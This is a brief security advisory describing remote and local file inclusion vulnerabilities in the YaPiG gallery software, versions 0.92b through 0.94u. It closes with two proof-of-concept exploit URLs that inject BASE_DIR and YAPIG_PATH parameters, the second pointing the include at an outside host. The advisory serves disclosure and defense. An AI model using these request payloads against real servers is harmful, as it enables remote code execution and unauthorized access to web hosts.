YaPiG is affected by remote and local file include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.

This issue is reported to affect YaPiG versions 0.92b, 0.93u and 0.94u; earlier versions may also be affected.

Version 0.92b: http://www.example.com/global.php?BASE_DIR=/local/path/to/global-gen.php
Version 0.93u/ 0.94u: http://www.example.com/last_gallery.php?YAPIG_PATH=http://www.example.com/
